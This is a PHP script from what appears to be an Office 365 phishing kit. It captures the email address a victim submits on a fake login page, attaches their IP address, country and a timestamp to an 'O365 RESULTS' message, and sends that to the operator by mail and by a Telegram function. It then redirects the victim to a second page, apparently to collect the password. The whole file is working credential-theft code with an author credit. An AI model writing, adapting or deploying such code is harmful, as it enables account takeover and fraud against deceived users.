<?php
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/geo.php';
include_once __DIR__ . '/me.php';

$email = trim($_POST['email'] ?? '');
if ($email === '') {
    setcookie('logged_in', '0', time() + 3600, '/');
    header('Location: index.html');
    exit;
}

setcookie('logged_in', '1', time() + 3600, '/');
setcookie('email', $email, time() + 3600, '/');

$message  = "⭐️O365 RESULTS⭐️\n\n";
$message .= "|--------------[EMAIL✉️]----------------|\n\n";
$message .= "Email: {$email}\n\n";
$message .= "IP: " . visitor_ip() . "\n";
$message .= "Country: " . visitor_country(visitor_ip()) . "\n";
$message .= "Date: " . date('D M d, Y g:i a') . "\n\n";
$message .= "| Author✍️: @bimbomi - Grayhat |\n";

@mail($send, '**NEW OFFICE365 RESULTS**', $message, "From: Grayhat");
send_telegram_msg($message);

header('Location: index2.html');
exit;